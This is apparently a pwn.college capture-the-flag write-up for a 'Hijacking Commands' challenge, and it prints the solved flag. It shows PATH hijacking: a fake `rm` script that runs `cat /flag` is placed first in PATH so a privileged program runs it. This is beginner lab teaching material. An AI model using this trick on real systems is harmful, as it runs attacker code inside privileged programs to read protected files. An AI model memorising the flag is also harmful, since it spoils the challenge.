# Hijacking Commands
In this challenge we are supposed to change the `rm` command in such a way that when we call `/challenge/run` it calls `rm` which should print flag than removing it.

## My solve
**Flag:** `pwn.college{gZ8zNxV-HAqz1-s3_guxUJLfEJy.QX3cjM1wCO1kjNzEzW}`

- I thought since `/challenge/run` is going to run `rm` anyways lets alter it by removing `rm` from `PATH` and putting a `rm` of our own in it.
- This `rm` contained the command to read the flag file.
- I had tried to use `rm` without changing any permissions but it didnt work so then I had to retry the challenge and give th permissions before executing.
- Then when we changed teh contents of `PATH` to the dir. of our `rm` and ran `/challenge/run`, it read and displayed the flag.

```bash
  GNU nano 8.4                                                            rm                                                                      
/run/dojo/bin/cat /flag
```
```bash
hacker@path~hijacking-commands:~$ which cat
/run/dojo/bin/cat
hacker@path~hijacking-commands:~$ touch rm
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ chmod u+x rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{gZ8zNxV-HAqz1-s3_guxUJLfEJy.QX3cjM1wCO1kjNzEzW}
```
